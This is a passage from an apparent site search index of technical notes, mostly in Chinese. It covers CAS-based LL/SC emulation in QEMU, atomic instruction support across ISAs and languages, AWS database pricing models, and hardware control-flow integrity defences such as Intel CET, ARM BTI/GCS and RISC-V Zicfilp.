LL/SC\uff1a\u200b\u4e0d\u200b\u5b8c\u7f8e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b ABA \u200b\u95ee\u9898\u200b\u3002\u200b\u7528\u200b\u6b63\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u4ee5\u200b\u4ee3\u66ff\u200b LL\uff0c\u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b\u548c\u200b\u8bfb\u53d6\u200b\u7684\u200b\u503c\u200b\uff1b\u200b\u5728\u200b\u539f\u6765\u200b SC \u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u5224\u65ad\u200b SC \u200b\u7684\u200b\u5730\u5740\u200b\u662f\u5426\u200b\u548c\u200b\u4e4b\u524d\u200b LL \u200b\u7684\u200b\u76f8\u540c\u200b\uff0c\u200b\u5982\u679c\u200b\u5730\u5740\u200b\u76f8\u540c\u200b\uff0c\u200b\u5219\u200b\u7528\u200b CAS \u200b\u5c1d\u8bd5\u200b\u5199\u5165\u200b\uff0c\u200b\u5982\u679c\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u7b49\u4e8e\u200b\u4e4b\u524d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5c31\u200b\u5199\u5165\u200b SC \u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b LL/SC \u200b\u548c\u200b CAS \u200b\u5728\u200b Linux \u200b\u4e2d\u200b\u4f7f\u7528\u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\uff1acmpxchg ll/sc portability\u3002</p> <p>\u200b\u4e8b\u5b9e\u4e0a\u200b\uff0cQEMU \u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u7528\u200b CAS \u200b\u5b9e\u73b0\u200b LL/SC\u3002\u200b\u867d\u7136\u200b\u5b83\u4f1a\u200b\u6709\u200b ABA \u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u5229\u7528\u200b LL/SC \u200b\u6765\u200b\u907f\u514d\u200b ABA \u200b\u95ee\u9898\u200b\u7684\u200b\u4ee3\u7801\u200b\u6bd4\u8f83\u200b\u5c11\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u8fd9\u4e48\u200b\u505a\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7cbe\u786e\u200b\u7684\u200b LL/SC \u200b\u6a21\u62df\u200b\uff0c\u200b\u8fd9\u65b9\u9762\u200b\u7684\u200b\u8bba\u6587\u200b\u4e5f\u200b\u4e0d\u5c11\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>Kristien, Martin, et al. \"Fast and correct load-link/store-conditional instruction handling in DBT systems.\" IEEE Transactions on Computer-Aided Design of Integrated Circuits and Systems 39.11 (2020): 3544-3554.</li> <li>Z. Zhao, Z. Jiang, Y. Chen, X. Gong, W. Wang and P. -C. Yew, \"Enhancing Atomic Instruction Emulation for Cross-ISA Dynamic Binary Translation,\" 2021 IEEE/ACM International Symposium on Code Generation and Optimization (CGO), Seoul, Korea (South), 2021, pp. 351-362, doi: 10.1109/CGO51591.2021.9370312.</li> </ul> <p>\u200b\u4f46\u200b\u5f88\u200b\u9057\u61be\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u5de5\u4f5c\u200b\u7684\u200b\u6027\u80fd\u200b\u90fd\u200b\u6ca1\u6709\u200b\u8fbe\u5230\u200b CAS \u200b\u6a21\u62df\u200b\u90a3\u4e48\u200b\u597d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd8\u662f\u200b\u6ca1\u6709\u200b\u88ab\u200b QEMU \u200b\u91c7\u7528\u200b\u3002\u200b\u5173\u4e8e\u200b QEMU \u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u91c7\u7528\u200b CAS \u200b\u6765\u200b\u6a21\u62df\u200b LL/SC \u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u89c1\u200b cmpxchg-based emulation of atomics\u3002</p>"},{"location":"software/atomic_instructions.html#_20","title":"\u7f16\u7a0b\u8bed\u8a00\u200b\u652f\u6301","text":"<p>\u200b\u76ee\u524d\u200b\u5f88\u591a\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\u90fd\u200b\u5185\u7f6e\u200b\u4e86\u200b\u5bf9\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>C: C11 \u200b\u5f15\u5165\u200b\u4e86\u200b stdatomic.h \u200b\u5934\u6587\u4ef6\u200b</li> <li>C++: C++11 \u200b\u5f15\u5165\u200b\u4e86\u200b atomic \u200b\u5934\u6587\u4ef6\u200b</li> <li>Rust\uff1a\u200b\u63d0\u4f9b\u200b\u4e86\u200b std::sync::atomic</li> </ul> <p>\u200b\u6839\u636e\u200b\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u652f\u6301\u200b\u7684\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u7c7b\u578b\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\u7684\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u88ab\u200b\u7ffb\u8bd1\u6210\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_21","title":"\u5176\u4ed6\u200b\u539f\u5b50\u200b\u6307\u4ee4","text":"<p>\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u8fd8\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5176\u4ed6\u200b\u7c7b\u578b\u200b\u7684\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>AArch64 \u200b\u63d0\u4f9b\u200b\u4e86\u200b 64 \u200b\u5b57\u8282\u200b\u7c92\u5ea6\u200b\u7684\u200b\u539f\u5b50\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b\uff1aLD64B \u200b\u4ece\u200b\u5185\u5b58\u200b\u539f\u5b50\u200b\u8bfb\u53d6\u200b\u8fde\u7eed\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u200b 8 \u200b\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff1bST64B \u200b\u628a\u200b\u8fde\u7eed\u200b 8 \u200b\u4e2a\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u539f\u5b50\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b</li> </ul>"},{"location":"software/atomic_instructions.html#_22","title":"\u4e0d\u540c\u200b\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u5bf9\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u652f\u6301\u200b\u7684\u200b\u5bf9\u6bd4","text":"ISA LL/SC CAS AMO HTM RISC-V A \u200b\u6269\u5c55\u200b Zacas \u200b\u6269\u5c55\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b A \u200b\u6269\u5c55\u200b \u200b\u65e0\u200b LoongArch \u200b\u6709\u200b\uff0cV1.1 \u200b\u652f\u6301\u200b\u4e86\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u9700\u8981\u200b V1.1 \u200b\u7248\u672c\u200b\uff0c\u200b\u4e0d\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u6709\u200b \u200b\u65e0\u200b x86_64 \u200b\u65e0\u200b \u200b\u6709\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u6709\u200b TSX AArch64 \u200b\u6709\u200b \u200b\u6709\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u6709\u200b TME MIPS \u200b\u6709\u200b\uff0c\u200b\u4e5f\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u6709\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u53cc\u500d\u200b\u5bbd\u5ea6\u200b \u200b\u6709\u200b \u200b\u65e0"},{"location":"software/aws_pricing.html","title":"AWS Pricing","text":""},{"location":"software/aws_pricing.html#rdbms","title":"RDBMS","text":""},{"location":"software/aws_pricing.html#amazon-aurora","title":"Amazon Aurora","text":"<p>Amazon Aurora Pricing Pricing Calculator</p> <p>Amazon Aurora is a modern relational database service. It offers unparalleled high performance and high availability at global scale with fully open-source MySQL- and PostgreSQL-compatible editions and a range of developer tools for building serverless and machine learning (ML)-driven applications.</p> <ol> <li>Instance type:<ol> <li>Aurora Standard</li> <li>Aurora I/O Optimized</li> </ol> </li> <li>Pricing by database instances:<ol> <li>Serverless: auto-scaling, billed per Aurora Capacity Units(ACU) per hour</li> <li>Provisioned On-Demand: billed per instance hour</li> <li>Provisioned Reserved: billed per term (1 year or 3 years)</li> </ol> </li> <li>Pricing by database storage and I/Os:<ol> <li>Storage: billed per GB per month</li> <li>I/O: billed per million requests, free if using Aurora I/O-Optimized</li> </ol> </li> <li>Aurora Global Database: single Aurora database to span multiple regions<ol> <li>Billing: billed per million replicated write I/Os</li> </ol> </li> <li>Backup storage costs: billed per GB per month</li> <li>Backtrack: quickly move to a prior point in time to recover from user errors<ol> <li>Billing: billed per 1 million change records(logs)</li> </ol> </li> <li>Data API: execute SQL queries through HTTPS<ol> <li>Billing: billed per 1 million requests</li> <li>32 KB metered per request, one 35KB payload accounts for two requests</li> </ol> </li> <li>Data transfer costs:<ol> <li>Free transfer from Internet to AWS</li> <li>Transfer from AWS to Internet billed per GB</li> <li>Transfer from one AWS region to another billed per GB</li> </ol> </li> <li>Extended support: billed per ACU/VCPU per hour</li> <li>Snapshot export to S3: billed per GB</li> <li>Zero-ETL integration with Amazon Redshift: no additional fee</li> </ol>"},{"location":"software/aws_pricing.html#amazon-redshift","title":"Amazon Redshift","text":"<p>Amazon Redshift Pricing</p> <ol> <li>On-demand pricing: billed per instance per hour</li> <li>Serverless: billed per RPU(Redshift Processing Unit) per hour</li> <li>Redshift managed storage: billed per GB per month</li> <li>Redshift Spectrum: directly run SQL queries against S3<ol> <li>Pricing: billed per TB of data scanned</li> </ol> </li> <li>Concurrency scaling: billed per instance per second</li> <li>Redshift ML: billed per million cells</li> <li>Reserved instance: billed per term (1 year or 3 years)</li> <li>Zero-ETL integration cost with Amazon Aurora: no additiona fee</li> <li>Backup storage: billed per GB per month</li> <li>Data transfer: billed per GB</li> </ol>"},{"location":"software/aws_pricing.html#nosql","title":"NoSQL","text":""},{"location":"software/aws_pricing.html#amazon-opensearch","title":"Amazon OpenSearch","text":"<p>Amazon OpenSearch pricing</p> <ol> <li>On-demand instance: billed per instance per hour</li> <li>Reserved instance: reserve for 1 year or 3 years<ol> <li>No upfront reserved instances: pay nothing upfront, pay a discounted hourly rate every hour</li> <li>Partial upfront reserved instances: pay a portion upfront, pay a discounted hourlay rate</li> <li>All upfront reserved instances, pay entirety of the cost upfront</li> </ol> </li> <li>Serverless:<ol> <li>Compute(Indexing, Search and Query): billed per OCU(OpenSearch Compute Unit) per hour</li> <li>Storage: billed per GB per month</li> </ol> </li> <li>Ingestion: billed per OCU per hour</li> <li>Direct Query: billed per OCU per hour</li> <li>EBS volume pricing: billed per GB per month</li> <li>UltraWarm and cold storage:<ol> <li>Compute: billed per hour per instance</li> <li>Storage: billed per GB per month</li> </ol> </li> </ol>"},{"location":"software/aws_pricing.html#amazon-documentdb","title":"Amazon DocumentDB","text":"<p>Amazon DocumentDB pricing</p> <p>AWS Pricing Calculator AWS Pricing Calculator</p> <p>Calculate your Amazon DocumentDB (with MongoDB compatibility) and architecture cost in a single estimate.</p> <p>Create your custom estimate now \u00bb</p> <p>Amazon DocumentDB (with MongoDB compatibility) is a fully managed document database service that supports MongoDB workloads. With Amazon DocumentDB, you only pay for what you use, and there are no upfront costs.</p> <ol> <li>Instance types: Standard vs I/O-Optimized</li> <li>On-demand instances: billed per instance per hour</li> <li>Storage: billed per GB per month</li> <li>I/O: billed per 1 million requests, free if using I/O-Optimized</li> <li>Elastic cluster:<ol> <li>Compute: billed per vCPU hour</li> <li>Storage: billed per GB per month</li> <li>Backup storage: billed per GB per month</li> </ol> </li> <li>Global clusters: fast replication across regions, billed per million replicated write I/O</li> <li>Data transfer: billed per GB</li> <li>Backup storage: billed per GB per month</li> </ol>"},{"location":"software/aws_pricing.html#amazon-dynamodb","title":"Amazon DynamoDB","text":"<p>Amazon DynamoDB pricing</p> <ol> <li>On-demand/Provisioned:<ol> <li>Write request: billed per million write request units (1KB)</li> <li>Read request: billed per million read request units (4KB)</li> <li>Storage: billed per GB per month</li> <li>Backup: billed per GB per month</li> <li>Restore from backup: billed per GB</li> <li>Global table: billed per million replicated write request units</li> <li>Change data capture for AWS Kinesis Data Streams/AWS Glue: billed per million change data capture units (1KB)</li> <li>Data import/export from/to S3: billed per GB</li> <li>DynamoDB Accelerator(caching service): billed per instance per hour</li> <li>DynamoDB Streams: billed per million read request units</li> <li>Data transfer: billed per GB</li> </ol> </li> </ol>"},{"location":"software/aws_pricing.html#others","title":"Others","text":""},{"location":"software/aws_pricing.html#amazon-athena","title":"Amazon Athena","text":"<p>Amazon Athena Pricing</p> <p>Amazon Athena is a serverless, interactive analytics service built on open-source frameworks that enables you to analyze petabytes of data where it lives. With Athena, you can use SQL or Apache Spark and there is no infrastructure to set up or manage. Pricing is simple: you pay based on data processed or compute used.</p> <ol> <li>SQL queries: billed per TB of data scanned<ol> <li>Save up to 90% by compressing, partitioning and using columnar formats</li> </ol> </li> <li>SQL queries with Provision Capacity: billed per DPU-hour(4 vCPU and 16GB memory) per minute</li> <li>Apache Spark application: billed per DPU-hour per minute</li> </ol>"},{"location":"software/cfi.html","title":"\u63a7\u5236\u6d41\u200b\u5b8c\u6574\u6027\u200b Control Flow Integrity","text":""},{"location":"software/cfi.html#_1","title":"\u76ee\u7684\u200b\u5730\u5740\u200b\u68c0\u67e5","text":"<p>\u200b\u4e00\u7c7b\u200b\u5e38\u89c1\u200b\u7684\u200b CFI \u200b\u673a\u5236\u200b\u662f\u200b\u68c0\u67e5\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\uff08call/jmp reg\uff09\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u662f\u5426\u200b\u843d\u5230\u200b\u9884\u671f\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\uff0c\u200b\u6bd4\u5982\u200b\u51fd\u6570\u200b\u7684\u200b\u5f00\u5934\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u673a\u5236\u200b\u4e3b\u8981\u200b\u9632\u6b62\u200b\u7684\u200b\u662f\u200b ROP gadget\uff0c\u200b\u5373\u200b\u4ece\u200b\u73b0\u6709\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e2d\u95f4\u200b\u67d0\u4e2a\u200b\u4f4d\u7f6e\u200b\u5f00\u59cb\u200b\u6267\u884c\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u653b\u51fb\u8005\u200b\u60f3\u8981\u200b\u7684\u200b\u6548\u679c\u200b\u3002\u200b\u5f15\u5165\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u68c0\u67e5\u200b\u540e\u200b\uff0c\u200b\u4e0d\u518d\u200b\u80fd\u200b\u4ece\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u5230\u200b\u4efb\u610f\u200b\u4f4d\u7f6e\u200b\u5f00\u59cb\u200b\u6267\u884c\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u9884\u671f\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u7528\u200b\u6307\u4ee4\u200b\u6765\u200b\u6807\u8bc6\u200b\u7684\u200b\u3002</p> <p>Intel CET(Control-flow Enforcement Technology) \u200b\u5305\u62ec\u200b IBT(Indirect Branch Tracking) \u200b\u673a\u5236\u200b\uff0c\u200b\u8981\u6c42\u200b call/jmp \u200b\u6307\u4ee4\u200b\u8df3\u8f6c\u200b\u5230\u200b endbr32/endbr64 \u200b\u6307\u4ee4\u200b\u3002\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-fcf-protection</code> \u200b\u6765\u200b\u542f\u7528\u200b IBT\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>readelf -n $BINARY</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u5b83\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u4e86\u200b IBT\uff1a<code>Properties: x86 feature: IBT, SHSTK</code>\u3002</p> <p>ARM BTI(Branch Target Identification) \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u8fd9\u79cd\u200b\u673a\u5236\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\uff0c\u200b\u901a\u8fc7\u200b\u9875\u8868\u200b\u7ed9\u200b\u9875\u200b\u6253\u200b\u4e0a\u200b Guarded Page \u200b\u6807\u8bb0\u200b\uff0c\u200b\u88ab\u200b\u4fdd\u62a4\u200b\u7684\u200b\u9875\u200b\u5185\u200b BTI \u200b\u673a\u5236\u200b\u751f\u6548\u200b\uff0c\u200b\u6b64\u65f6\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5fc5\u987b\u200b\u662f\u200b\u4e00\u6761\u200b BTI \u200b\u7c7b\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5426\u5219\u200b\u5c31\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u3002\u200b\u5728\u200b\u4e0d\u200b\u652f\u6301\u200b BTI \u200b\u7684\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0cBTI \u200b\u4f1a\u200b\u88ab\u200b\u5f53\u6210\u200b NOP \u200b\u6307\u4ee4\u200b\uff0c\u200b\u56e0\u4e3a\u200b BTI \u200b\u5b9a\u4e49\u200b\u5728\u200b\u4e86\u200b\u539f\u6765\u200b\u7684\u200b NOP \u200b\u6307\u4ee4\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u3002\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-mbranch-protection=bti</code> \u200b\u6765\u200b\u542f\u7528\u200b BTI\uff0c\u200b\u6216\u8005\u200b\u8fdb\u4e00\u6b65\u200b\u7528\u200b <code>-mbranch-protection=standard</code> \u200b\u6765\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b BTI \u200b\u548c\u200b PAC \u200b\u4e24\u4e2a\u200b\u4fdd\u62a4\u200b\u673a\u5236\u200b\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>readelf -n $BINARY</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u5b83\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u4fdd\u62a4\u200b\u673a\u5236\u200b\uff1a<code>Properties: AArch64 feature: BTI, PAC</code>\u3002</p> <p>RISC-V Zicfilp \u200b\u6269\u5c55\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u5f88\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u5728\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u671f\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4e0a\u653e\u200b\u4e00\u6761\u200b LPAD \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u6ca1\u200b\u8df3\u200b\u5230\u200b LPAD \u200b\u4e0a\u200b\uff0c\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u3002LPAD \u200b\u4e5f\u200b\u662f\u200b\u590d\u7528\u200b\u4e86\u200b\u5df2\u6709\u200b\u7684\u200b NOP \u200b\u6307\u4ee4\u200b\u7a7a\u95f4\u200b\uff08AUIPC \u200b\u7684\u200b rd=x0\uff09\uff0c\u200b\u6240\u4ee5\u200b\u5728\u200b\u6ca1\u6709\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u6269\u5c55\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u4e0a\u4f1a\u200b\u88ab\u200b\u5f53\u6210\u200b NOP \u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"software/cfi.html#_2","title":"\u5f71\u5b50\u200b\u6808","text":"<p>\u200b\u53e6\u4e00\u7c7b\u200b\u5e38\u89c1\u200b\u7684\u200b CFI \u200b\u68c0\u67e5\u200b\u9488\u5bf9\u200b\u7684\u200b\u662f\u200b call/ret \u200b\u6307\u4ee4\u200b\uff0c\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cret \u200b\u4f1a\u200b\u8fd4\u56de\u200b\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b call \u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f46\u200b\u653b\u51fb\u8005\u200b\u4f1a\u200b\u5e0c\u671b\u200b\u901a\u8fc7\u200b\u63a7\u5236\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u6765\u200b\u631f\u6301\u200b\u63a7\u5236\u6d41\u200b\u3002\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u63a7\u5236\u6d41\u200b\u631f\u6301\u200b\uff0c\u200b\u4e8e\u662f\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\u5f71\u5b50\u200b\u6808\u200b\uff08Shadow Stack\uff09\uff0c\u200b\u5b83\u200b\u4ee5\u6808\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5b58\u50a8\u200b call stack \u200b\u4fe1\u606f\u200b\uff0c\u200b\u9664\u4e86\u200b call \u200b\u4f1a\u200b push\uff0cret \u200b\u4f1a\u200b pop \u200b\u4ee5\u5916\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5185\u5bb9\u200b\u8981\u200b\u7528\u200b\u7279\u5b9a\u200b\u7684\u200b\u6307\u4ee4\u200b\u53bb\u200b\u4fee\u6539\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u653b\u51fb\u8005\u200b\u7be1\u6539\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5728\u200b ret \u200b\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b Shadow Stack \u200b\u68c0\u67e5\u200b ret \u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u8df3\u8f6c\u200b\u5230\u200b\u4e86\u200b\u6b63\u786e\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002</p> <p>Intel CET(Control-flow Enforcement Technology) \u200b\u9664\u4e86\u200b IBT \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b SHSTK(shadow stack) \u200b\u673a\u5236\u200b\u3002\u200b\u5b83\u200b\u5bf9\u200b\u73b0\u6709\u200b\u6307\u4ee4\u200b\u7684\u200b\u4fee\u6539\u200b\u4ee5\u53ca\u200b\u5f15\u5165\u200b\u7684\u200b\u65b0\u200b\u6307\u4ee4\u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li>call \u200b\u6307\u4ee4\u200b\u9664\u4e86\u200b\u73b0\u6709\u200b\u7684\u200b\u628a\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b push \u200b\u5230\u200b\u5185\u5b58\u200b\u91cc\u200b rsp \u200b\u6307\u5411\u200b\u7684\u200b\u6808\u200b\u4e0a\u200b\uff0c\u200b\u8fd8\u4f1a\u200b\u628a\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b push \u200b\u5230\u200b shadow stack \u200b\u4e0a\u200b</li> <li>ret \u200b\u6307\u4ee4\u200b\u9664\u4e86\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b rsp \u200b\u6307\u5411\u200b\u7684\u200b\u6808\u200b\u4e0a\u200b pop \u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd8\u4f1a\u200b\u4ece\u200b shadow stack \u200b\u4e0a\u200b pop \u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\uff0c\u200b\u5982\u679c\u200b\u4e24\u4e2a\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5219\u200b\u629b\u51fa\u200b\u5f02\u5e38\u200b</li> <li>shadow stack \u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u4fdd\u5b58\u200b\u5728\u200b\u5185\u5b58\u200b\u91cc\u200b\uff0c\u200b\u4f46\u662f\u200b\u548c\u200b rsp \u200b\u6307\u5411\u200b\u7684\u200b\u6808\u200b\u653e\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u65b9\u200b\uff1ashadow stack \u200b\u6240\u5728\u200b\u7684\u200b\u9875\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u9875\u8868\u200b\u6253\u200b\u4e0a\u200b shadow stack \u200b\u7684\u200b\u6807\u8bb0\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8fd9\u4e2a\u200b\u9875\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u901a\u8fc7\u200b mov \u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\uff0c\u200b\u53ea\u80fd\u200b\u7528\u200b call \u200b\u6307\u4ee4\u200b\u6216\u200b\u7279\u5b9a\u200b\u7684\u200b\u6307\u4ee4\u200b\u6765\u200b\u4fee\u6539\u200b\u9875\u200b\u5185\u200b\u7684\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b</li> <li>\u200b\u589e\u52a0\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff1ashadow stack pointer(SSP)\uff0c\u200b\u5b83\u200b\u4e0d\u662f\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u529f\u80fd\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b rsp\uff0c\u200b\u6307\u5411\u200b shadow stack \u200b\u7684\u200b\u6808\u9876\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\uff0c\u200b\u65b0\u589e\u200b saveprevssp \u200b\u548c\u200b rstorssp \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4f9b\u200b\u5185\u6838\u200b\u4f7f\u7528\u200b</li> <li>\u200b\u9488\u5bf9\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b call/ret \u200b\u53ef\u80fd\u200b\u4e0d\u200b\u914d\u5bf9\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u7528\u200b incssp \u200b\u6765\u200b\u624b\u52a8\u200b\u589e\u52a0\u200b ssp\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b pop \u200b\u4e86\u200b\u82e5\u5e72\u4e2a\u200b\u5143\u7d20\u200b</li> </ol> <p>\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-fcf-protection</code> \u200b\u6765\u200b\u542f\u7528\u200b SHSTK\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>readelf -n $BINARY</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u5b83\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u4e86\u200b IBT\uff1a<code>Properties: x86 feature: IBT, SHSTK</code>\u3002</p> <p>ARM GCS(Guarded Control Stack) \u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u6808\u6765\u200b\u4fdd\u5b58\u200b\u8c03\u7528\u200b\u6808\u200b\u3002\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b 